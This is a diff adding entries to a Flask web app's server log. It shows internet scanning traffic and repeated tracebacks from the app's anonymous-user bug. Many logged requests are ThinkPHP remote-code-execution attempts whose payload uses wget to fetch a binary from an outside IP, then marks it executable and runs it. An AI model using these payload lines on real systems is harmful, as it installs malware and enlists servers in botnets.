@@ -5646,3 +5646,819 @@ AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
 209.97.191.16 - - [01/Sep/2024 09:44:50] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01ü\x01\x00\x01ø\x03\x03ø\x06\x03/À\x99Ê£îÞ·J')
 83.168.78.67 - - [01/Sep/2024 11:08:09] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://31.172.87.248/bns/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
 80.82.77.202 - - [01/Sep/2024 11:20:44] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+152.32.150.7 - - [01/Sep/2024 15:52:07] code 400, message Bad request version ('\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À')
+120.46.218.252 - - [01/Sep/2024 16:34:36] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 63, in __call__
+    return self.engineio_app.handle_request(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/socketio/server.py", line 433, in handle_request
+    return self.eio.handle_request(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/server.py", line 272, in handle_request
+    socket = self._get_socket(sid)
+             ^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/base_server.py", line 229, in _get_socket
+    raise KeyError('Session is disconnected')
+KeyError: 'Session is disconnected'
+Invalid session 9tuLk2o0HIJU1S_EAAAb (further occurrences of this error will be logged with level INFO)
+198.135.50.97 - - [01/Sep/2024 17:08:04] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/website/views.py", line 557, in check_username
+    if current_user.type != 'admin':
+      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+117.72.10.174 - - [01/Sep/2024 18:55:41] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+124.70.191.180 - - [01/Sep/2024 18:58:19] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 63, in __call__
+    return self.engineio_app.handle_request(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/socketio/server.py", line 433, in handle_request
+    return self.eio.handle_request(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/server.py", line 272, in handle_request
+    socket = self._get_socket(sid)
+             ^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/base_server.py", line 229, in _get_socket
+    raise KeyError('Session is disconnected')
+KeyError: 'Session is disconnected'
+5.8.11.202 - - [01/Sep/2024 19:46:09] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+200.81.185.179 - - [01/Sep/2024 20:08:20] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://157.230.218.54/bins/nine.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+80.82.77.202 - - [01/Sep/2024 21:13:31] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+123.56.28.158 - - [01/Sep/2024 22:21:16] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+185.224.128.17 - - [01/Sep/2024 22:40:21] code 400, message Bad request syntax ('\x05\x01\x00')
+185.224.128.17 - - [01/Sep/2024 22:40:21] code 400, message Bad request syntax ('\x04\x01\x00P\x00\x00\x00\x01\x00example.com\x00')
+117.72.13.252 - - [01/Sep/2024 23:42:30] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+172.169.111.226 - - [02/Sep/2024 01:57:40] code 400, message Bad request syntax ('MGLNDD_95.179.222.63_80')
+117.72.77.71 - - [02/Sep/2024 02:25:25] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+117.72.13.252 - - [02/Sep/2024 02:37:34] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 854, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 463, in raise_routing_exception
+    raise request.routing_exception  # type: ignore[misc]
+  File "/usr/local/lib/python3.11/dist-packages/flask/ctx.py", line 362, in match_request
+    result = self.url_adapter.match(return_rule=True)  # type: ignore
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/werkzeug/routing/map.py", line 629, in match
+    raise NotFound() from None
+werkzeug.exceptions.NotFound: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 765, in handle_user_exception
+    return self.handle_http_exception(e)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 740, in handle_http_exception
+    return self.ensure_sync(handler)(e)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/main.py", line 22, in page_not_found
+    if current_user.type == "admin" :
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+123.56.28.158 - - [02/Sep/2024 07:11:16] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+65.49.1.15 - - [02/Sep/2024 07:41:25] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1b5\x81#l')
+141.255.160.234 - - [02/Sep/2024 08:37:45] code 400, message Bad request syntax ('POST /cgi-bin/luci/;stok=/locale HTTP/1.1 HTTP/1.1')
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 63, in __call__
+    return self.engineio_app.handle_request(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/socketio/server.py", line 433, in handle_request
+    return self.eio.handle_request(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/server.py", line 272, in handle_request
+    socket = self._get_socket(sid)
+             ^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/base_server.py", line 229, in _get_socket
+    raise KeyError('Session is disconnected')
+KeyError: 'Session is disconnected'
+198.235.24.83 - - [02/Sep/2024 09:07:49] code 400, message Bad request version ('À\x13À')
+198.235.24.83 - - [02/Sep/2024 09:07:50] code 400, message Bad request version ('À(À$À\x14À')
+34.148.186.28 - - [02/Sep/2024 09:55:46] code 400, message Bad request version ('d¸·\x96\x7f²À')
+118.25.193.89 - - [02/Sep/2024 12:33:07] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+93.174.93.12 - - [02/Sep/2024 13:04:24] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 854, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 463, in raise_routing_exception
+    raise request.routing_exception  # type: ignore[misc]
+  File "/usr/local/lib/python3.11/dist-packages/flask/ctx.py", line 362, in match_request
+    result = self.url_adapter.match(return_rule=True)  # type: ignore
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/werkzeug/routing/map.py", line 629, in match
+    raise NotFound() from None
+werkzeug.exceptions.NotFound: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 765, in handle_user_exception
+    return self.handle_http_exception(e)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 740, in handle_http_exception
+    return self.ensure_sync(handler)(e)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/main.py", line 22, in page_not_found
+    if current_user.type == "admin" :
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+192.155.90.118 - - [02/Sep/2024 13:53:39] code 400, message Bad request version ('À\x14À')
+128.199.148.66 - - [02/Sep/2024 14:02:10] code 400, message Bad request version ('À\x14À')
+128.199.148.66 - - [02/Sep/2024 14:02:10] code 400, message Bad request version ('À\x14À')
+172.104.11.4 - - [02/Sep/2024 14:35:54] code 400, message Bad request version ('À\x14À')
+76.11.185.195 - - [02/Sep/2024 14:40:36] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://192.210.162.147/x86 -O /tmp/.matrix; chmod 777 /tmp/.matrix; /tmp/.matrix thinkphp' HTTP/1.1")
+123.56.28.158 - - [02/Sep/2024 15:22:31] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+124.70.191.180 - - [02/Sep/2024 15:26:28] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+45.79.172.21 - - [02/Sep/2024 15:46:09] code 400, message Bad request version ('À\x14À')
+123.58.207.155 - - [02/Sep/2024 16:01:47] code 400, message Bad request version ('\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À')
+147.182.153.246 - - [02/Sep/2024 17:17:31] code 400, message Bad request version ('À\x14À')
+147.182.153.246 - - [02/Sep/2024 17:17:31] code 400, message Bad request version ('À\x14À')
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 854, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 463, in raise_routing_exception
+    raise request.routing_exception  # type: ignore[misc]
+  File "/usr/local/lib/python3.11/dist-packages/flask/ctx.py", line 362, in match_request
+    result = self.url_adapter.match(return_rule=True)  # type: ignore
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/werkzeug/routing/map.py", line 629, in match
+    raise NotFound() from None
+werkzeug.exceptions.NotFound: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 765, in handle_user_exception
+    return self.handle_http_exception(e)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 740, in handle_http_exception
+    return self.ensure_sync(handler)(e)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/main.py", line 22, in page_not_found
+    if current_user.type == "admin" :
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+1.92.154.133 - - [02/Sep/2024 17:44:02] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+80.82.77.202 - - [02/Sep/2024 18:09:59] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 854, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 463, in raise_routing_exception
+    raise request.routing_exception  # type: ignore[misc]
+  File "/usr/local/lib/python3.11/dist-packages/flask/ctx.py", line 362, in match_request
+    result = self.url_adapter.match(return_rule=True)  # type: ignore
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/werkzeug/routing/map.py", line 629, in match
+    raise NotFound() from None
+werkzeug.exceptions.NotFound: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+                                                ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 765, in handle_user_exception
+    return self.handle_http_exception(e)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 740, in handle_http_exception
+    return self.ensure_sync(handler)(e)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/spy/spynet/main.py", line 22, in page_not_found
+    if current_user.type == "admin" :
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 854, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 463, in raise_routing_exception
+    raise request.routing_exception  # type: ignore[misc]
+  File "/usr/local/lib/python3.11/dist-packages/flask/ctx.py", line 362, in match_request
+    result = self.url_adapter.match(return_rule=True)  # type: ignore
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/werkzeug/routing/map.py", line 629, in match
+    raise NotFound() from None
+werkzeug.exceptions.NotFound: 404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.11/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
